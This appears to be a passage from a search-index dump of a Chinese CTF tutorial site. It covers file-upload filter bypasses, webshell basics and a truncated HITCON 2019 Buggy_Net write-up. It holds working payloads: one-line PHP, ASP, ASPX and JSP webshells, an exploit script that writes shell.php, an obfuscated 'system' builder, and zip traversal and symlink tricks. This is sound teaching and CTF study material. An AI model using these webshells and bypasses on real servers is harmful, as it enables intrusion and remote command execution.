<p>\uff08\u5c31\u8ddf\u731c\u6d4b\u7ba1\u7406\u5458\u7684\u7528\u6237\u540d\u79f0\u4e3aadmin\u662f\u4e00\u4e2a\u9053\u7406\uff09</p> <p>\u8fd9\u91cc\u662f/upload/a.phtml\u627e\u5230\u540e\u8fde\u63a5\uff0c\u76f8\u5f53\u4e8e\u4f60\u5df2\u7ecf\u62ff\u5230\u4e86\u76ee\u6807\u7cfb\u7edf\u7684\u63a7\u5236\u6743\u9650</p> <p></p> <p></p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_2","title":"\u4e0a\u4f20\u7ed5\u8fc7\u59ff\u52bf","text":""},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_3","title":"\u524d\u7aef\u4e0a\u4f20\u8fc7\u6ee4","text":"<p>\u524d\u7aef\u5bf9\u6587\u4ef6\u540e\u7f00\u8fdb\u884c\u68c0\u67e5\uff0c\u8be5\u79cd\u901a\u8fc7\u6293\u5305\u4fee\u6539\u6570\u636e\u5305\u5373\u53ef\u89e3\u51b3\u3002</p> <p>\u6240\u8c13\u7684\u524d\u7aef\u5c31\u662f\u4f60\u6240\u770b\u5230\u7684\u6d4f\u89c8\u5668\u7684\u9875\u9762\uff0c\u4ed6\u628a\u8fc7\u6ee4\u51fd\u6570\u4e5f\u4e00\u8d77\u4f20\u8fc7\u6765\u6267\u884c\uff0c</p> <p>\u8fd9\u4e2a\u7b80\u5355\uff0c\u751a\u81f3\u4f60F12\u628a\u90a3\u6bb5\u8fc7\u6ee4\u7684\u4ee3\u7801\u5220\u9664\u90fd\u884c</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_4","title":"\u6587\u4ef6\u540d\u68c0\u67e5","text":"<p>\u5927\u5c0f\u5199\u7ed5\u8fc7</p> <ul> <li>\u5728windows\u4e0b\uff0c\u53ef\u4ee5\u5c06\u540e\u7f00\u5199\u4e3apHp</li> </ul> <p>unicode</p> <ul> <li>\u5f53\u76ee\u6807\u5b58\u5728json_decode\u4e14\u68c0\u67e5\u5728json_decode\u4e4b\u524d,\u53ef\u4ee5\u5c06php\u5199\u4e3a\\u0070hp</li> </ul> <p>php3457</p> <ul> <li>\u8be5\u9879\u4e3aapache\u4e13\u5c5e</li> </ul> <p>\u5173\u952e\u70b9\u5728<code>/etc/apache2/mods-available/php5.6.conf</code>\u8fd9\u4e2a\u6587\u4ef6\uff0c\u6ee1\u8db3<code>.+\\.ph(p[3457]?|t|tml)$</code>\uff0c\u90fd\u4f1a\u88ab\u5f53\u4f5cphp\u6587\u4ef6\u89e3\u6790\u3002\u5728apache2\u76ee\u5f55\u4e0b<code>grep -r x-httpd-php /etc/apache2</code>\u627e\u5230\u5bf9\u5e94\u6587\u4ef6\u5c31\u80fd\u77e5\u9053\u89e3\u6790\u54ea\u4e9b\u540e\u7f00</p> <p></p> <p>\u5229\u7528\u6b63\u5219\u56de\u6eafpcre\u9650\u5236</p> <ul> <li>\u8fd9\u4e2a\u4e4b\u524d\u63d0\u8d77\u5230\u8fc7</li> </ul> <p>pcre\u9ed8\u8ba4\u9650\u5236\u4e3a100w</p> <p>\u6709\u5982\u4e0b\u573a\u666f</p> <pre><code>&lt;?phpif(!preg_match('/.+?ph/is',$_POST['n']))file_put_contents($_POST['n'],$_POST['s']);\nPlain Text\n</code></pre> <p>\u53ef\u5229\u7528\u5982\u4e0bexp\u89e3\u51b3</p> <pre><code>import requests\ndata= {'n':\"php://filter/write=convert.base64-decode/\"+'/'*1000000+'/resource=shell.php','s':\"PD9waHAgcGhwaW5mbygpPz4=\"}######\u6240\u4ee5\u6211\u8bf4\u662f100wprint (requests.post('http://127.0.0.1',data=data).text)\nPlain Text\n</code></pre>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_5","title":"\u8bf7\u6c42\u5934\u68c0\u67e5","text":"<p>\u5c06php\u6587\u4ef6\u7684<code>content-type:application/octet-stream</code>\u4fee\u6539\u4e3a<code>image/png</code>\u7b49\u5c31\u53ef\u4ee5</p> <p>\u9644\u4e0a\u4e00\u4e2a\u67e5\u627e\u7684\u7f51\u7ad9</p> <p>HTTP Content-type \u5bf9\u7167\u8868</p> <p>OSCHINA.NET\u5728\u7ebf\u5de5\u5177,ostools\u4e3a\u5f00\u53d1\u8bbe\u8ba1\u4eba\u5458\u63d0\u4f9b\u5728\u7ebf\u5de5\u5177\uff0c\u63d0\u4f9bjsbin\u5728\u7ebf CSS\u3001JS \u8c03\u8bd5\uff0c\u5728\u7ebf Java API\u6587\u6863,\u5728\u7ebf PHP API\u6587\u6863,\u5728\u7ebf Node.js API\u6587\u6863,Less CSS\u7f16\u8bd1\u5668\uff0cMarkDown\u7f16\u8bd1\u5668\u7b49\u5176\u4ed6\u5728\u7ebf\u5de5\u5177</p> <p>https://tool.oschina.net/commons/</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_6","title":"\u6587\u4ef6\u5185\u5bb9\u68c0\u67e5","text":"<p>\u7ed5\u8fc7&lt;?php,&lt;?=</p> <p>https://www.php.net/manual/zh/language.basic-syntax.phpmode.php</p> <p></p> <p>\u5176\u4e2d\u7b2c2\u79cd\u5728php7\u79cd\u4e0d\u53ef\u4ee5\u4f7f\u7528\uff0c\u5728php5\u4e2d\u53ef\u4ee5\u4f7f\u7528</p> <p>\u5176\u5b9e\u5c31\u662f\u4e00\u53e5\u8bdd\u6728\u9a6c\u76844\u79cd\u5199\u6cd5\uff08\u8334\u5b57\u76844\u79cd\u5199\u6cd5\uff0c\u4f60\u77e5\u9053\u4e48...\uff09</p> <p>\u7ed5\u8fc7[a-zA-Z0-9]</p> <p>\u4e00\u4e9b\u4e0d\u5305\u542b\u6570\u5b57\u548c\u5b57\u6bcd\u7684webshell | \u79bb\u522b\u6b4c</p> <p>phith0n\u7684\u5c0f\u7ad9\uff0c\u957f\u671f\u5b58\u5728\u4e0e\u5206\u4eab\u5173\u4e8e\u7f51\u7edc\u5b89\u5168\u4e0e\u5404\u79cd\u7f16\u7a0b\u7684\u539f\u521b\u6587\u7ae0\u3002</p> <p>https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</p> <p>\u65e0\u5b57\u6bcd\u6570\u5b57webshell\u4e4b\u63d0\u9ad8\u7bc7 | \u79bb\u522b\u6b4c</p> <p>phith0n\u7684\u5c0f\u7ad9\uff0c\u957f\u671f\u5b58\u5728\u4e0e\u5206\u4eab\u5173\u4e8e\u7f51\u7edc\u5b89\u5168\u4e0e\u5404\u79cd\u7f16\u7a0b\u7684\u539f\u521b\u6587\u7ae0\u3002</p> <p>https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</p> <p>\ud83d\udc46\u8fd9\u4e2a\u786e\u5b9e\u662f\u4e2a\u5927\u795e</p> <p>\u4ec5\u6570\u5b57+\u7b26\u53f7</p> <ul> <li>waf\u4ee3\u7801\u5982\u4e0b\uff1a</li> </ul> <pre><code>&lt;?php error_reporting(0); if(!isset($_GET['num'])){     show_source(__FILE__); }else{     $str = $_GET['num'];     $blacklist = ['[a-z]', '[\\x7f-\\xff]', '\\s',\"'\", '\"', '`', '\\[', '\\]','\\$', '_', '\\\\\\\\','\\^', ','];     foreach ($blacklist as $blackitem) {         if (preg_match('/' . $blackitem . '/im', $str)) {             die(\"what are you want to do?\");         }     }     @eval('echo '.$str.';'); } ?&gt;\nPlain Text\n</code></pre> <p>\u4f7f\u7528\u5982\u4e0b</p> <pre><code>&lt;?php $a ='';$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(3)){1}));$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(9)){1}));$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(3)){1}));$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(4)){1}));$a .= (((10000000000000000000).(1)){3});$a .= ((((10000000000000000000).(1)){3})|(((-1).(1)){0}));echo $a; //systEm?&gt;\n&lt;?php $a ='';$a .= (((10000000000000000000).(1)){3}); // E$a .= (((((10000000000000000000).(1)){3})|(((1.1).(1)){1}))&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(6)){1}))); //n$a .= ((((10000000000000000000).(1)){3})&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(6)){1}))); //Decho $a; //EnD?&gt;\n&lt;?php // getallheaders$a ='';$a .= ((((10000000000000000000).(1)){3})|(((1.1).(1)){1})&amp;((~(((1).(8)){1})|(((1).(7)){1})))); // g$a .= (((10000000000000000000).(1)){3}); // E$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(4)){1})); //T$a .= ((((10000000000000000000).(1)){3})&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(1)){1}))); //a$a .= (((((10000000000000000000).(1)){3})|(((1.1).(1)){1}))&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(4)){1}))); // l$a .= (((((10000000000000000000).(1)){3})|(((1.1).(1)){1}))&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(4)){1}))); // l$a .= (((((10000000000000000000).(1)){3})|(((1.1).(1)){1}))&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))); // h$a .= (((10000000000000000000).(1)){3}); // E$a .= ((((10000000000000000000).(1)){3})&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(1)){1}))); //a$a .= ((((10000000000000000000).(1)){3})&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(4)){1}))); //D$a .= (((10000000000000000000).(1)){3}); // E$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(2)){1})); // r$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(3)){1})); // secho $a;?&gt;\n</code></pre> <p>RCTF 2020 Official Writeup - ROIS Blog</p> <p>https://blog.rois.io/en/2020/rctf-2020-official-writeup-2/</p> <p>\u7ed5\u8fc7;(\u5206\u53f7)</p> <ul> <li></li> </ul> <pre><code>&lt;?=phpinfo()?&gt;\n</code></pre> <p>exif_imagetype()</p> <ul> <li>\u8be5\u51fd\u6570\u4e3a\u83b7\u53d6\u56fe\u7247\u7684\u7c7b\u578b\uff0c\u5e38\u7528\u4e8e\u68c0\u6d4b\u4e0a\u4f20\u6587\u4ef6\u7684\u7c7b\u578b</li> </ul> <p>\uff081\uff09\u53ef\u4ee5\u4f7f\u7528\u5728\u6587\u4ef6\u5934\u6dfb\u52a0\u9b54\u672f\u5b57\u8282GIF89a\u5373\u53ef\u7ed5\u8fc7</p> <p>\uff082\uff09\u4f7f\u7528copy\u547d\u4ee4\u5c06\u6728\u9a6c\u653e\u5728\u4e00\u4e2a\u6b63\u5e38\u6587\u4ef6\u4e4b\u540e</p> <p>get_imagesize()</p> <ul> <li>\u8be5\u51fd\u6570\u4e3a\u83b7\u53d6\u56fe\u7247\u7684\u957f\u5bbd\uff0c\u5e38\u7528\u4e8e\u68c0\u6d4b\u4e0a\u4f20\u6587\u4ef6\u7684\u7c7b\u578b</li> </ul> <p>\uff081\uff09\u53ef\u4ee5\u5728\u6587\u4ef6\u4e4b\u524d\u6dfb\u52a0</p> <pre><code>#define width 1337                          #define height 1337\n</code></pre> <p>\u5373\u53ef\u7ed5\u8fc7</p> <p>\u4e8c\u6b21\u6e32\u67d3</p> <ul> <li></li> </ul> <p>\u6316\u6d1e\u59ff\u52bf\uff1a\u7279\u6b8a\u7684\u4e0a\u4f20\u6280\u5de7\uff0c\u7ed5\u8fc7PHP\u56fe\u7247\u8f6c\u6362\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff08RCE\uff09 - FreeBuf\u7f51\u7edc\u5b89\u5168\u884c\u4e1a\u95e8\u6237</p> <p>\u6211\u4f7f\u7528\u4e86\u4e00\u4e2a\u7279\u6b8a\u7684\u56fe\u7247\u4e0a\u4f20\u6280\u5de7\uff0c\u7ed5\u8fc7PHP GD\u5e93\u5bf9\u56fe\u7247\u7684\u8f6c\u6362\u5904\u7406\uff0c\u6700\u7ec8\u6210\u529f\u5b9e\u73b0\u4e86\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002</p> <p></p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_7","title":"\u591a\u6587\u4ef6\u4e0a\u4f20","text":"<p>\u5f53\u670d\u52a1\u5668\u652f\u6301\u591a\u6587\u4ef6\u4e0a\u4f20\uff0c\u4f46\u53ea\u5bf9\u4e0a\u4f20\u7684\u7b2c\u4e00\u4e2a\u8fdb\u884c\u8fc7\u6ee4\u65f6\uff0c\u53ef\u4ee5\u4e00\u6b21\u4e0a\u4f20\u591a\u4e2a\u6587\u4ef6\u8fdb\u884c\u7ed5\u8fc7\u3002</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_8","title":"\u538b\u7f29\u6587\u4ef6\u4e0a\u4f20","text":"<p>tar\u538b\u7f29\u5305</p> <ul> <li>linux\u73af\u5883</li> </ul> <pre><code>ln -s / 1.jpg \u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u751f\u6210\u4e00\u4e2a\u540d\u4e3a1.jpg\u7684\u8f6f\u94fe\u63a5tar cf 1.tar 1.jpg\u4e0a\u4f20\u5230\u670d\u52a1\u5668\uff0c\u8bbf\u95ee1.jpg\uff0c\u5c31\u53ef\u4ee5\u5728\u670d\u52a1\u5668\u4e2d\u6f2b\u6e38\u4e86\u4e5f\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u529e\u6cd5\u7ed5\u8fc7php_flag engine off\n</code></pre> <p>https://250.ac.cn/2019/11/09/2019-\u6e56\u6e58\u676f-web\u90e8\u5206-WriteUp/#\u9884\u671f\u89e3</p> <p>zip\u538b\u7f29\u5305</p> <ul> <li>\u5982\u679c\u670d\u52a1\u5668\u5bf9\u4e0a\u4f20\u7684zip\u6587\u4ef6\u76f4\u63a5\u89e3\u538b\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u6784\u7b51\u8fd9\u6837\u4e00\u4e2a\u6587\u4ef6\u6765\u7ed5\u8fc7</li> </ul> <p>\u73af\u5883\uff1a/var/www/html/upload\u76ee\u5f55\u4e0d\u89e3\u6790php\u6587\u4ef6\uff0c\u89e3\u538b\u6587\u4ef6\u9ed8\u8ba4\u5728upload\u4e0b</p> <pre><code>\u65b0\u5efa1234.php\uff0c\u5185\u5bb9\u4efb\u610f\u5c061234.php\u538b\u7f29\u4e3a1234.zip\u6587\u4ef6\u4f7f\u7528hxd\u6216\u8005010editor\u7b4916\u8fdb\u5236\u7f16\u8f91\u5668\u7f16\u8f911234.zip\u6587\u4ef6\uff0c\u5c06\u6240\u6709\u5b57\u7b26\u4e321234.php\u66ff\u6362\u4e3a../1.php\uff08../1\u5171\u56db\u4f4d\u6240\u4ee5\u4f7f\u75281234\u4e3a\u6587\u4ef6\u540d\uff0c\u53ef\u6839\u636e\u9700\u6c42\u4fee\u6539\uff09\uff0c\u4fdd\u5b58\u3002\u5c06\u4fee\u6539\u540e\u76841234.zip\u4e0a\u4f20\uff0c\u7ecf\u8fc7\u670d\u52a1\u5668\u89e3\u538b\uff0c\u4f1a\u5728/var/www/html\u4e0b\u751f\u6210\u4e00\u4e2a1.php\n</code></pre> <p>\u5176\u5b9e\u538b\u7f29\u6587\u4ef6\u4e0a\u4f20\u7684\u8bdd\uff0c\u540e\u9762\u7684\u4f2a\u534f\u8bae\u4e5f\u6709\u4e00\u4e9b\u6765\u8bfb\u53d6\u538b\u7f29\u6587\u4ef6\u7684\u64cd\u4f5c</p> <p>\u6bd4\u5982\u8bf4zip://\u548cphar://\u4f2a\u534f\u8bae\uff08jar\u662f\u4e0d\u662f\u548cphar\u5f88\u50cf\uff1fjar=java,phar=php\uff09</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_9","title":"\u6761\u4ef6\u7ade\u4e89","text":"<p>\u5728\u4e00\u4e9b\u4e0a\u4f20\u573a\u666f\u4e2d\uff0c\u4e0a\u4f20\u7684\u6587\u4ef6\u4e0a\u4f20\u6210\u529f\u540e\u4f1a\u88ab\u7acb\u9a6c\u5220\u9664\uff0c\u5bfc\u81f4\u65e0\u6cd5\u8bbf\u95ee\u4e0a\u4f20\u7684\u6587\u4ef6\u3002\u6240\u4ee5\u4ece\u4e0a\u4f20\u6210\u529f\u5230\u88ab\u5220\u9664\u7684\u8fd9\u6bb5\u65f6\u95f4\u5927\u6982\uff08\u51e0\u767ems\uff09\u5b58\u5728\u4e00\u4e2a\u7a7a\u6863\uff0c\u6211\u4eec\u5229\u7528\u8fd9\u6bb5\u7a7a\u6863\u53ef\u4ee5\u8bbf\u95ee\u5230\u4e0a\u4f20\u7684\u6587\u4ef6\u3002\u4f46\u662f\u624b\u5de5\u64cd\u4f5c\u80af\u5b9a\u662f\u6765\u4e0d\u53ca\uff0c\u6211\u4eec\u5199\u811a\u672c\u64cd\u4f5c\u4e5f\u6765\u4e0d\u53ca\u3002\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u4e0d\u65ad\u7684\u4e0a\u4f20\u6587\u4ef6\uff0c\u5e76\u4e0d\u65ad\u7684\u8bbf\u95ee\u5230\u8fbe\u76ee\u7684\u3002</p> <p>\u4f9d\u8d56\u4e8e\u811a\u672c\uff0c\u540e\u9762\u627e\u5230\u4e86\u4f1a\u653e\u4e2a\u4f8b\u5b50\u4e0a\u6765\u3002</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#else","title":"else\u5176\u4ed6","text":"<p>\u4e0b\u9762\u7684\u81ea\u5df1\u6162\u6162\u770b\u6162\u6162\u5b66\u5427</p> <p>rce</p> <pre><code>imagick rce:CVE-2016\u20133714Plain Text\n</code></pre> <p>file_put_contents</p> <ul> <li><code>file_put_contents($filename,$content);</code></li> </ul> <p>filename\u53c2\u6570\u652f\u6301\u4ee5url\u5f62\u5f0f\u5199\u5165\uff0c\u652f\u6301php\u4f2a\u534f\u8bae\uff0c\u652f\u6301\u8fdc\u7a0b\u8bfb\u53d6\u6587\u4ef6</p> <p>\u5177\u4f53\u53c2\u8003\uff1a</p> <p>file_put_content\u548c\u6b7b\u4ea1\u00b7\u6742\u7cc5\u4ee3\u7801\u4e4b\u7f18 - \u5148\u77e5\u793e\u533a</p> <p>\u5148\u77e5\u793e\u533a\uff0c\u5148\u77e5\u5b89\u5168\u6280\u672f\u793e\u533a</p> <p>https://xz.aliyun.com/t/8163</p>"},{"location":"web/upload/%E6%9C%A8%E9%A9%AC/","title":"\u6728\u9a6c\u8ba4\u77e5","text":"<p>\u6728\u9a6c\u75c5\u6bd2\u662f\u6307\u9690\u85cf\u5728\u6b63\u5e38\u7a0b\u5e8f\u4e2d\u7684\u4e00\u6bb5\u5177\u6709\u7279\u6b8a\u529f\u80fd\u7684\u6076\u610f\u4ee3\u7801\uff0c\u662f\u5177\u5907\u7834\u574f\u548c\u5220\u9664\u6587\u4ef6\u3001\u53d1\u9001\u5bc6\u7801\u3001\u8bb0\u5f55\u952e\u76d8\u548c\u653b\u51fbDos\u7b49\u7279\u6b8a\u529f\u80fd\u7684\u540e\u95e8\u7a0b\u5e8f\u3002\u6728\u9a6c\u75c5\u6bd2\u5176\u5b9e\u662f\u8ba1\u7b97\u673a\u9ed1\u5ba2\u7528\u4e8e\u8fdc\u7a0b\u63a7\u5236\u8ba1\u7b97\u673a\u7684\u7a0b\u5e8f\uff0c\u5c06\u63a7\u5236\u7a0b\u5e8f\u5bc4\u751f\u4e8e\u88ab\u63a7\u5236\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u4e2d\uff0c\u91cc\u5e94\u5916\u5408\uff0c\u5bf9\u88ab\u611f\u67d3\u6728\u9a6c\u75c5\u6bd2\u7684\u8ba1\u7b97\u673a\u5b9e\u65bd\u64cd\u4f5c\u3002\u4e00\u822c\u7684\u6728\u9a6c\u75c5\u6bd2\u7a0b\u5e8f\u4e3b\u8981\u662f\u5bfb\u627e\u8ba1\u7b97\u673a\u540e\u95e8\uff0c\u4f3a\u673a\u7a83\u53d6\u88ab\u63a7\u8ba1\u7b97\u673a\u4e2d\u7684\u5bc6\u7801\u548c\u91cd\u8981\u6587\u4ef6\u7b49\u3002\u53ef\u4ee5\u5bf9\u88ab\u63a7\u8ba1\u7b97\u673a\u5b9e\u65bd\u76d1\u63a7\u3001\u8d44\u6599\u4fee\u6539\u7b49\u975e\u6cd5\u64cd\u4f5c\u3002\u6728\u9a6c\u75c5\u6bd2\u5177\u6709\u5f88\u5f3a\u7684\u9690\u853d\u6027\uff0c\u53ef\u4ee5\u6839\u636e\u9ed1\u5ba2\u610f\u56fe\u7a81\u7136\u53d1\u8d77\u653b\u51fb\u3002</p> <p>\u767e\u5ea6\u5230\u7684\u6807\u51c6\u5b9a\u4e49</p> <p>\u6587\u4ef6\u4e0a\u4f20\u7684\u76ee\u7684\u662f\u4e0a\u4f20\u6728\u9a6c\u4ee5\u8fbe\u5230\u63a7\u5236\u76ee\u6807\u670d\u52a1\u5668\u7684\u76ee\u7684\u3002\u548c\u7834\u73af\u6027\u7684\u75c5\u6bd2\u662f\u6709\u533a\u522b\u7684</p> <p>ctf\u4e2d\u7684\u6728\u9a6c\u6ca1\u6709\u5230\u7279\u522b\u9ad8\u7684\u6c34\u5e73\uff0c\u57fa\u672c\u4e5f\u4e0d\u4f1a\u6d89\u53ca\u5230\u6728\u9a6c\u7684\u514d\u6740\uff0c\u4e0d\u6b7b\u9a6c\u6ce8\u5165\u7cfb\u7edf\u8fdb\u7a0b\u7b49\u7b49\u7cfb\u5217\u7684\u6280\u672f\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u4e86\u89e3\u4e00\u70b9\u57fa\u672c\u7684\u6728\u9a6c\u6280\u672f\u4ee5\u8fbe\u5230\u6211\u4eec\u7684\u76ee\u7684\u5373\u53ef\uff1a\u62ff\u5230\u540e\u53f0\u7684\u63a7\u5236\u6743\u9650\u3002</p>"},{"location":"web/upload/%E6%9C%A8%E9%A9%AC/#_2","title":"\u4e00\u53e5\u8bdd\u6728\u9a6c","text":"<p>\u8fd9\u4e9b\u90fd\u662f\u7528\u5728\u6587\u4ef6\u4e0a\u4f20\u4e2d\u7684\uff0c\u6bd4\u8f83\u7b80\u5355\u7684\u6728\u9a6c\u3002</p> <p>\uff081\uff09\u6728\u9a6c\u4e0a\u4f20\u6210\u529f\uff0c\u672a\u88ab\u6740\uff1b</p> <p>\uff082\uff09\u77e5\u9053\u6728\u9a6c\u7684\u8def\u5f84\u5728\u54ea\uff1b</p> <p>\uff083\uff09\u4e0a\u4f20\u7684\u6728\u9a6c\u80fd\u6b63\u5e38\u8fd0\u884c\u3002</p>"},{"location":"web/upload/%E6%9C%A8%E9%A9%AC/#php","title":"PHP","text":"<pre><code>&lt;?php @eval($_POST['attack']) ?&gt;&lt;script language='php'&gt;@eval($_POST['cmd']);&lt;/script&gt;\nPlain Text\n</code></pre> <p>\u8fd9\u4e2a\u6728\u9a6c\u7684\u610f\u601d\u662f\u63a5\u53d7POST\u7684\u6570\u636e\u5e76\u4e14\u5c06\u5b57\u7b26\u4e32\u4ee5PHP\u4ee3\u7801\u6267\u884c\uff08eval()\u51fd\u6570\uff09</p>"},{"location":"web/upload/%E6%9C%A8%E9%A9%AC/#asp","title":"asp","text":"<pre><code>&lt;%eval request (\"pass\")%&gt;\nPlain Text\n</code></pre>"},{"location":"web/upload/%E6%9C%A8%E9%A9%AC/#aspx","title":"aspx","text":"<pre><code>&lt;%@ Page Language=\"Jscript\"%&gt; &lt;%eval(Request.Item[\"pass\"],\"unsafe\");%&gt;\nPlain Text\n</code></pre>"},{"location":"web/upload/%E6%9C%A8%E9%A9%AC/#_3","title":"\u56fe\u7247\u9a6c","text":"<pre><code>copy 001.jpeg/b + test.php/a 2.jpg\u7136\u540etest.php\u5185\u7684\u5185\u5bb9\uff1a&lt;?php eval($_POST['yuer']); ?&gt;\nPlain Text\n</code></pre> <p>\u6211\u8bb0\u5f97kali\u91cc\u9762\u6709\u4e2a\u81ea\u5e26\u7684\u56fe\u7247\u9a6c\uff0c\u4f46\u662f\u6211\u5fd8\u4e86\u53eb\u5565\u540d\u5b57\u3002</p>"},{"location":"web/upload/%E6%9C%A8%E9%A9%AC/#java-script","title":"Java script","text":"<pre><code>&lt;%\nif(\"023\".equals(request.getParameter(\"pwd\"))){\njava.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream();\nint a = -1;\nbyte[] b = new byte[2048];\nout.print(\"&lt;pre&gt;\");\nwhile((a=in.read(b))!=-1){\n out.println(new String(b));\n}\nout.print(\"&lt;/pre&gt;\");\n}\n%&gt;\n</code></pre>"},{"location":"web/upload/%E6%9C%A8%E9%A9%AC/#_4","title":"\u6728\u9a6c\u8fde\u63a5\u5de5\u5177","text":"<p>\u5e38\u89c1\u7684\u6709\u4e2d\u56fd\u83dc\u5200\uff0c\u4e2d\u56fd\u8681\u5251\uff0ckali\u91cc\u9762\u81ea\u5e26\u7684Weevely</p> <p>kali linux:</p> <p>weevely generate b.php//\u751f\u6210\u4e00\u4e2awebshell\u5ba2\u6237\u7aef\u7a0b\u5e8f <p>weevely  //\u94fe\u63a5URL\u4e0a\u7684\u6587\u4ef6\uff0c\u5176\u4e2dwebshell\u5173\u952e\u5b57\u4e3apassword <p>\u4e2d\u56fd\u8681\u5251</p> <p>https://github.com/AntSwordProject/AntSword-Loader</p> <p>github\u4e0a\uff0c\u6bd4\u83dc\u5200\u5b89\u5168\uff08\u80fd\u641c\u5230\u7684\u5f88\u591a\u88ab\u4eba\u690d\u5165\u4e86\u6728\u9a6c\uff09</p> <p>\u83dc\u5200\u4e0d\u8bf4\u4e86\u3002</p> <p></p> <p>\u8681\u5251\u6253\u5f00\u5c31\u8fd9\u6837\u3002\u5f88\u7b80\u5355\uff0c\u800c\u4e14\u7528\u8d77\u6765\u4e5f\u6ca1\u5565\u96be\u70b9</p>"},{"location":"web/writeup/HITCON%202019%20Buggy_Net/","title":"[Windows]HITCON 2019 Buggy_Net","text":"<pre><code>    bool isBad = false;\n    try {\n        if ( Request.Form[\"filename\"] != null ) {\n            isBad = Request.Form[\"filename\"].Contains(\"..\") == true;\n        }\n    } catch (Exception ex) {\n\n    } \n\n    try {\n        if (!isBad) {\n            Response.Write(System.IO.File.ReadAllText(@\"C:\\inetpub\\wwwroot\\\" + Request.Form[\"filename\"]));\n        }\n    } catch (Exception ex) {\n\n    }\n%&gt;&lt;/font&gt;&lt;/h3&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u9898\u76ee\u7ed9\u51fa\u6e90\u7801</p> <p>\u6293\u5305\u5206\u6790\uff0c\u6709\u548c\u5e73\u65f6\u4e0d\u592a\u4e00\u6837\u7684\u4e1c\u897f\uff1a</p> <pre><code>HTTP/1.1 500 Internal Server Error\n\nCache-Control: private\n\nContent-Type: text/html; charset=utf-8\n\nServer: Microsoft-IIS/10.0\n\nX-AspNet-Version: 4.0.30319\n\nX-Powered-By: ASP.NET\n\nDate: Sun, 01 Aug 2021 05:04:07 GMT\n\nConnection: close\n\nContent-Length: 3420\n</code></pre> <p>\u5bf9\u5e94\u4f7f\u7528\u7684ASP.NET 4.0\u7248\u672c</p> <pre><code>1:\nBasic idea\nThe basic idea of that vulnerability is that, for POST requests, request validation prevents \u201cdangerous content\u201d (e.g. HTML tags or similar, such as &lt;x) in POST form fields by terminating the whole application. However, the same content in query-string fields will pass initial request validation and will \u201conly\u201d raise an exception on first access of Request.QueryString[...] (since that field is populated on first access?)\n\nSimilarly, for GET requests, request validation prevents \u201cdangerous content\u201d (e.g. HTML tags or similar, such as &lt;x) in GET query-string fields by terminating the whole application. However, the same content in form fields (i.e. in a request body encoded as application/x-www-form-urlencoded) will pass initial request validation and will \u201conly\u201d raise an exception on first access of Request.Form[...] (again, since that field is populated on first access?)\n\nNevertheless, query-string fields in a POST request are accessbile through Request.QueryString[...] and form fields submitted in the request body of a GET request (with content-type application/x-www-form-urlencoded) are accessible through Request.Form[...].\n\nHence, we should be able to successfully submit the form by the sending a GET request without any query-string field but with the filename field in the request body. Further, by also including another form field in the request body that will trigger that \u201clate\u201d request validation bug (or is it a feature if Microsoft declared to won\u2019t fix? \ud83d\ude1c), e.g. a simple &amp;o=&lt;x, we should be able to trigger an exception on first access of Request.Form[\"filename\"] \u2026 and this is exactly what we need to escape from the first try-catch-block before changing isBad.\n\nhttps://www.sigflag.at/blog/2019/writeup-hitconctf2019-buggy-dot-net/\n\n\n\n\n2:\nSo I started to read the .NET source code, and I found that we should use some malicious payload (e.g. XSS) to trigger the Request Validation exception.\n\n(The function calling chain looks like: Form.get -&gt; ValidateHttpValueCollection -&gt; collection.EnableGranularValidation -&gt; ValidateString -&gt; 